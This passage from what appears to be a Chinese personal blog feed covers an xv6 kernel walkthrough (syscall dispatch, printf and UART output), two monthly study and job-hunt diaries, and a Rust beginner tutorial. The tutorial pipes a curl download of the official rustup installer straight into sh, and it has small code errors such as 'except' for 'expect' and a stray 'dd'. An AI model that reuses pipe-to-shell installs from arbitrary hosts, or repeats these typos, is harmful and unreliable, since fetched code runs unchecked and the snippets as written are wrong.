class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理系统调用的函数的原型</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mkdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_close</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出系统调用号，检查对应的系统调用是否存在，不存在则打印错误</span></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 存在则执行对应的系统调用处理函数，并把返回值存到 a0 中，后面会传递给用户进程</span></span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syscall</code> 会根据用户进程指定的系统调用号执行指定的系统调用处理函数</p><p>最后会经过 <code>usertrapret</code>、<code>userret</code> 返回到用户进程</p><h3 id="省流小结-1"><a href="#省流小结-1" class="headerlink" title="省流小结"></a>省流小结</h3><p>ecall -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>syscall</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; ecall + 4</p><p>关键在于 <code>syscall</code> 根据系统调用号调用对应的系统调用处理函数</p><h2 id="怎么获取系统调用所需的用户参数"><a href="#怎么获取系统调用所需的用户参数" class="headerlink" title="怎么获取系统调用所需的用户参数"></a>怎么获取系统调用所需的用户参数</h2><p>#todo</p><h2 id="怎么实现可变参数-printf-并输出"><a href="#怎么实现可变参数-printf-并输出" class="headerlink" title="怎么实现可变参数 printf 并输出"></a>怎么实现可变参数 printf 并输出</h2><p>这里介绍内核的 <code>printf</code>（kernel/printf.c）</p><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>其实可变参数是由 C 语言库和编译器来实现的</p><p>C 语言库中给出了 <code>va_start</code>、<code>va_arg</code>、<code>va_end</code> 接口，这里只简单介绍一下，想详细了解可参考末尾的链接，不过是 x86_64 架构，原理类似</p><ul><li><code>va_list</code>：一个变量类型，variable arguments list 可变参数列表</li><li><code>va_start(v, l)</code>：初始化可变参数列表，l 为函数的第一个参数名</li><li><code>va_arg(v, type)</code>：从可变参数列表中取出一个参数，须指定参数类型</li><li><code>va_end(v)</code>：结束时释放 va_list 内存</li></ul><p>我们知道 RISC-V 前 8 个参数是放在 a0-7 寄存器中，它是怎么又从寄存器中取值又从栈中取值的</p><p>答案是编译器会将除 a0 以外的寄存器全部压到栈中，这样所有参数都是连续存储在栈中，便于取值，但是不要自己去取地址然后输出（笑），要用 C 语言库的接口</p><h3 id="输出到硬件"><a href="#输出到硬件" class="headerlink" title="输出到硬件"></a>输出到硬件</h3><p>每次输出时将一个字符传给硬件，硬件回显给控制台</p><p>内核中有 <code>consputc</code> 就是将字符传给硬件的函数，在 kernel/console.c 中</p><figure class="highlight c"><figcaption><span>kernel/console.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">consputc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(c == BACKSPACE)&#123;</span><br><span class="line">    <span class="comment">// 如果是退格，那么就输出先退格，输出一个空格，再退格</span></span><br><span class="line">    uartputc_sync(<span class="string">&#x27;\b&#x27;</span>); uartputc_sync(<span class="string">&#x27; &#x27;</span>); uartputc_sync(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则直接输出</span></span><br><span class="line">    uartputc_sync(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递给硬件寄存器具体在 kernel/uart.c 的 <code>uartputc_sync</code> 函数中</p><figure class="highlight c"><figcaption><span>kernel/uart.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uartputc_sync</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 关闭硬件中断</span></span><br><span class="line">  push_off();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等待之前的字符传输完成，硬件准备接收字符</span></span><br><span class="line">  <span class="keyword">while</span>((ReadReg(LSR) &amp; LSR_TX_IDLE) == <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="comment">// 把字符写入硬件用于接收字符的寄存器中</span></span><br><span class="line">  WriteReg(THR, c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 开启硬件中断</span></span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>接下来看看 <code>printf</code> 代码实现</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="type">int</span> i, c, locking;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加锁</span></span><br><span class="line">  locking = pr.locking;</span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    acquire(&amp;pr.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fmt == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;null fmt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 ap</span></span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历 fmt</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; (c = fmt[i] &amp; <span class="number">0xff</span>) != <span class="number">0</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(c != <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = fmt[++i] &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">    <span class="comment">// 如果前一个是 % 接下来根据后面的字母获取对应类型的变量</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">      printptr(va_arg(ap, uint64));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span>((s = va_arg(ap, <span class="type">char</span>*)) == <span class="number">0</span>)</span><br><span class="line">        s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span>(; *s; s++)</span><br><span class="line">        consputc(*s);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// 如果是不支持的字母，则直接输出 % 和字母</span></span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放内存</span></span><br><span class="line">  va_end(ap);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 解锁</span></span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    release(&amp;pr.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实逻辑挺简单的</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/94036267">揭秘X86架构C可变参数函数实现原理</a>：其实这篇文章所说的 x86 指的是 x86_64</p><h2 id="怎么成功创建一个进程"><a href="#怎么成功创建一个进程" class="headerlink" title="怎么成功创建一个进程"></a>怎么成功创建一个进程</h2><p>#todo</p><h2 id="怎么实现页表的创建与更新"><a href="#怎么实现页表的创建与更新" class="headerlink" title="怎么实现页表的创建与更新"></a>怎么实现页表的创建与更新</h2><p>#todo</p><h2 id="怎么实现虚拟地址映射"><a href="#怎么实现虚拟地址映射" class="headerlink" title="怎么实现虚拟地址映射"></a>怎么实现虚拟地址映射</h2><p>#todo </p><h2 id="怎么实现线程切换"><a href="#怎么实现线程切换" class="headerlink" title="怎么实现线程切换"></a>怎么实现线程切换</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人对 xv6 这个简易操作系统内核比较感兴趣，就想写一个剖析，看看 xv6 都是怎么实现这些功能的，坚持一周更一个话题&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>2023.05</title>
    <link href="https://humoooor.cn/2023/05/10/2023.05/"/>
    <id>https://humoooor.cn/2023/05/10/2023.05/</id>
    <published>2023-05-10T12:05:00.000Z</published>
    <updated>2024-01-04T04:30:27.214Z</updated>
    
    <content type="html"><![CDATA[<p>转好的五月（？）</p><span id="more"></span><h2 id="Week-5-2023-05-01-2023-05-07"><a href="#Week-5-2023-05-01-2023-05-07" class="headerlink" title="Week 5 (2023.05.01 - 2023.05.07)"></a>Week 5 (2023.05.01 - 2023.05.07)</h2><p>出去完回来了，剩下再玩几天</p><p>荣耀笔试过了😋，但别高兴太早</p><p>把笔试题用 Rust 过一遍，发现全是简单题 😅，wsfw</p><p>投了菁英班，以前把华子当保底，现在高攀不起 😭</p><p>🏓 被薄纱了</p><p>下周期望：</p><ol><li>Rust 继续看</li><li>开始 xv6</li></ol><h2 id="Week-6-2023-05-08-2023-05-14"><a href="#Week-6-2023-05-08-2023-05-14" class="headerlink" title="Week 6 (2023.05.08 - 2023.05.14)"></a>Week 6 (2023.05.08 - 2023.05.14)</h2><p>开始 xv6 了，一开始的 Utilities 和 System calls 还比较简单，到 Page tables 的时候因为 RISC-V 页表知识忘得差不多了，准备再去看看笔记和视频，复习一遍</p><p>荣耀一面过了😋，做了性格测试，听说会刷人，有点慌😰</p><p>Rustlings 还剩一点</p><p>下周期望：</p><ol><li>xv6 Page tables、Traps、COW</li></ol><h2 id="Week-7-2023-05-15-2023-05-21"><a href="#Week-7-2023-05-15-2023-05-21" class="headerlink" title="Week 7 (2023.05.15 - 2023.05.21)"></a>Week 7 (2023.05.15 - 2023.05.21)</h2><p>看完 Page tables，想写一个 xv6 剖析，比如系统调用的实现过程、创建一个进程的过程等等，希望不鸽</p><p><del>荣耀二面了，第一个二面的企业，感谢荣耀，solute！</del></p><p>荣耀寄了😭</p><p>准备下华子面试</p><p>最近开始学下五十音图捏</p><p>思考一下学习时间安排，感觉应该在一段时间里专心学一件事情，比如两天学 xv6，两天学 rust 这样</p><p>下周期望：</p><ol><li>xv6 Traps、COW</li><li>看一下 Go 的漏洞挖掘</li><li>看一下 glibc malloc</li></ol><h2 id="Week-8-2023-05-22-2023-05-28"><a href="#Week-8-2023-05-22-2023-05-28" class="headerlink" title="Week 8 (2023.05.22 - 2023.05.28)"></a>Week 8 (2023.05.22 - 2023.05.28)</h2><p>开了个 xv6 剖析的坑，写了点内容，有点成就感捏😋</p><p>看了会 Go 的 Pwn，发现好难 o(╥﹏╥)o，开摆了</p><p>稍微复习了下 glibc 和 musl libc 就去面试了</p><p>线下面试还要手写代码😰，判断素数，忘记遍历时把平方根带进去了（<del>应该没事吧</del>）</p><p>周六一上午把华子面完了，本来以为二面下午才开始，收拾好东西到宿舍了，收到二面已开始的通知（急急急），又赶回去面试了</p><p>一面手撕简单的找最大子串，手贱自己写了个例子没通过，面试官给的例子倒是过了（</p><p>华子你⑨⑨我吧</p><p>下周期望：</p><ol><li>各种课的 ddl</li><li>xv6 继续</li><li>是不是要开始预习期末了（？）</li></ol><h2 id="Week-9-2023-05-29-2023-05-31"><a href="#Week-9-2023-05-29-2023-05-31" class="headerlink" title="Week 9 (2023.05.29 - 2023.05.31)"></a>Week 9 (2023.05.29 - 2023.05.31)</h2><p>摆了三天，只写完了 ddl</p><p>开始投小厂</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个月又熟悉了一遍 xv6 和 RISC-V，然后完善了对应的文章，然后对 gdb 也更熟练了，之前还不知道怎么对着源码下断点</p><p>实习还是一筹莫展，急急急</p><p>下月期望</p><ul><li>准备<del>复习</del>预习期末</li><li>突破 0 offer</li><li>早睡早起</li><li>xv6 看情况继续</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;转好的五月（？）&lt;/p&gt;</summary>
    
    
    
    <category term="Month Report" scheme="https://humoooor.cn/categories/Month-Report/"/>
    
    
  </entry>
  
  <entry>
    <title>2023.04</title>
    <link href="https://humoooor.cn/2023/04/09/2023.04/"/>
    <id>https://humoooor.cn/2023/04/09/2023.04/</id>
    <published>2023-04-09T08:00:00.000Z</published>
    <updated>2024-01-04T04:30:25.166Z</updated>
    
    <content type="html"><![CDATA[<p>心血来潮想要记录自己的学习过程，希望能坚持下去 —— 慌乱的一个月</p><span id="more"></span><h2 id="Week-1-2023-04-01-2023-04-09"><a href="#Week-1-2023-04-01-2023-04-09" class="headerlink" title="Week 1 (2023.04.01 - 2023.04.09)"></a>Week 1 (2023.04.01 - 2023.04.09)</h2><p>发现 Rust <a href="https://doc.rust-lang.org/stable/book/">圣经</a>的<a href="https://kaisery.github.io/trpl-zh-cn/">中文译本</a>，准备以此学习 Rust，其他文档作为补充</p><p>本来想着边学 Rust 边做笔记，但是发现速度有点慢，毕竟 Rust 只是训练营的前置技能（QAQ）</p><p><del>这周也忙着其他事情，放在 Rust 的时间不多</del>（都是借口！）</p><p>因此只写了两篇文章，一篇<a href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/">入门</a>，一篇所有权<del>（如果你看到我了，说明所有权还没有写好）</del>，以后可能只会写一些比较需要注意的点<del>（争取多写点🕊🕊🕊）</del></p><p>和群友讨论了下 enum 的特点，发现它是一个 tagged union（或许只有我不知道555），了解了它的内存布局</p><p>Rustlings 做到了 structs，要加速！</p><p>看可信计算平台的文档，调研可行性</p><p>下周期望：</p><ol><li>看完 Rust 圣经</li><li>做完 Rustlings</li><li>调研可信计算平台的可行性</li></ol><h2 id="Week-2-2023-04-10-2023-04-16"><a href="#Week-2-2023-04-10-2023-04-16" class="headerlink" title="Week 2 (2023.04.10 - 2023.04.16)"></a>Week 2 (2023.04.10 - 2023.04.16)</h2><p>果然上一周的孽，这一周加倍还</p><p>为了赶进度，草草做完了 Rustlings，圣经还没细看</p><p>经讨论发现可信计算平台短短几个月时间根本弄不完，放弃了</p><p>下周期望：</p><ol><li>看完 Rust 圣经<ul><li>一定要细看，多写写代码</li></ul></li><li>学习 RISC-V 架构<ul><li>非特权级指令</li><li>特权级指令</li><li>页表</li></ul></li></ol><h2 id="Week-3-2023-04-17-2023-04-23"><a href="#Week-3-2023-04-17-2023-04-23" class="headerlink" title="Week 3 (2023.04.17 - 2023.04.23)"></a>Week 3 (2023.04.17 - 2023.04.23)</h2><p>由于身体原因，去医院去了好几趟，真费时间啊</p><p>Rust 还没看完 🐔</p><p>就跟着 OS 课程看了一遍 RISC-V 讲义</p><p>成绩出来了，彻底放弃保研想法😭，准备找实习了😭</p><p>投了</p><ul><li>地平线的嵌入式开发，简历直接 🐔 了 😰</li><li>百度的安全工程师，笔试 🐔 了，怎么都是 Web 安全啊 😡</li><li>招行的测试（？），一面 🐔 了</li></ul><p>下周期望：</p><ol><li>继续看 Rust 圣经</li><li><del>开始 rcore</del></li></ol><h2 id="Week-4-2023-04-24-2023-04-30"><a href="#Week-4-2023-04-24-2023-04-30" class="headerlink" title="Week 4 (2023.04.24 - 2023.04.30)"></a>Week 4 (2023.04.24 - 2023.04.30)</h2><p>这周有点摆，女朋友出去玩捏 🥰</p><p>思考了一下就业方向，准备找 Linux/OS 开发</p><p>做了荣耀的 OS 开发笔试，就做了一道半 😭， 感觉有点悬</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>稀里糊涂的一个月，瞻前顾后，最后还是决定就业</p><p>下月期望</p><ol><li>看完 Rust 圣经</li><li>继续完成落下的 xv6</li><li>拿到一个实习 offer（真的可以吗）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;心血来潮想要记录自己的学习过程，希望能坚持下去 —— 慌乱的一个月&lt;/p&gt;</summary>
    
    
    
    <category term="Month Report" scheme="https://humoooor.cn/categories/Month-Report/"/>
    
    
  </entry>
  
  <entry>
    <title>Rust 入门</title>
    <link href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/"/>
    <id>https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/</id>
    <published>2023-04-04T09:58:00.000Z</published>
    <updated>2023-10-04T11:48:43.723Z</updated>
    
    <content type="html"><![CDATA[<p>仅仅介绍 Rust 的安装、Cargo、变量、数据类型、函数和控制流</p><span id="more"></span><p>环境：Ubuntu 22.04 rustc 1.68.2</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 https://sh.rustup.rs -sSf | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">$ rustup update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">$ rustup self uninstall</span><br></pre></td></tr></table></figure><p>安装时会下载 rustup 工具，并安装最新版 Rust 一系列工具（编译器 rustc 等）</p><p>rustup 是一个管理 Rust 版本和相关工具的命令行工具</p><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world!"></a>Hello world!</h2><p>程序员传统捏~</p><figure class="highlight rust"><figcaption><span>hello.rs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 rustc hello.rs 编译</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code> 函数：不用多说，程序入口</p><p><code>println!</code>：调用了一个宏（如果是调用函数，后面没有<code>!</code>）</p><p><code>&quot;Hello world!&quot;</code>：将字符串传递给 <code>println</code></p><p>分号 <code>;</code> 结尾：大部分语句都以问号结尾</p><h2 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h2><p>Cargo 是 Rust 的构建系统和包管理器。大多数 Rustacean 们使用 Cargo 来管理他们的 Rust 项目，因为它可以为你处理很多任务，比如构建代码、下载依赖库并编译这些库。</p><p>下面的命令会创建一个 hello_cargo 的项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo new hello_cargo</span><br></pre></td></tr></table></figure><p>里面有一个 <code>Cargo.toml</code> 文件，这是 Cargo 的配置文件</p><figure class="highlight toml"><figcaption><span>Cargo.toml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;hello_cargo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br></pre></td></tr></table></figure><p><code>[package]</code>：表明下面为一个包的配置</p><p><code>[dependencies]</code>：罗列项目使用的依赖，依赖的代码包也被称为 crate</p><h3 id="构建并运行项目"><a href="#构建并运行项目" class="headerlink" title="构建并运行项目"></a>构建并运行项目</h3><p>下面的命令用于构建项目，并生成 target 文件夹和 Cargo.lock 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build</span><br></pre></td></tr></table></figure><p><code>target/debug/hello_carge</code> 为编译出来的可执行文件，我们可以直接运行这个文件，也可以使用下面的命令来编译并运行项目，更加方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cargo run</span><br><span class="line">  Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.46s  </span><br><span class="line">    Running `target/debug/hello_cargo`  </span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p>下面的命令可以检查代码确保可以编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo check</span><br><span class="line">   Checking hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.20s</span><br></pre></td></tr></table></figure><h3 id="发布项目"><a href="#发布项目" class="headerlink" title="发布项目"></a>发布项目</h3><p>在构建时使用 <code>--release</code> 参数，来优化编译项目，并在 <code>target/release</code> 目录下生成可执行文件，启用优化编译时间更长，但是运行速度更快，没有调试信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build --release</span><br><span class="line">  Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished release [optimized] target(s) <span class="keyword">in</span> 0.19s</span><br></pre></td></tr></table></figure><h2 id="变量和可变性"><a href="#变量和可变性" class="headerlink" title="变量和可变性"></a>变量和可变性</h2><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [<span class="keyword">mut</span>] &#123;var_name&#125;: &#123;var_type&#125; = &#123;value&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line"><span class="comment">// 将 x 从 &quot;-1&quot; 转换成 -1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">except</span>(<span class="string">&quot;&quot;</span>); </span><br></pre></td></tr></table></figure><p>value_type 和 value 必须出现一个，在某些情况（如类型转换）下，两者都要出现</p><p>每次只可以定义一个变量</p><h3 id="可变性-mutable"><a href="#可变性-mutable" class="headerlink" title="可变性 mutable"></a>可变性 mutable</h3><p>在 Rust 中，变量默认是不可改变的（immutable），在声明变量时在变量名前加上 <code>mut</code> 使其具有可变性</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;dd</span><br><span class="line">    <span class="comment">// x 默认不可变，会出现编译错误</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 添加 mut 后，允许 x 的值改变</span></span><br><span 